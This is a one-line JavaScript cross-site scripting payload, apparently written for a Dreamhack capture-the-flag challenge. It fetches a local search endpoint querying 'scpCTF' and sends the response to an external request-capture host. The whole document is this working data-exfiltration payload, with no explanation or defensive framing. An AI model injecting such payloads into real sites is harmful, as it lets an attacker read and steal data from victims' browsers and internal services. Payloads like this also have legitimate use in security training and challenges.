fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{fetch("https://xzhvqww.request.dreamhack.games/?data="+encodeURIComponent(text))})</script>
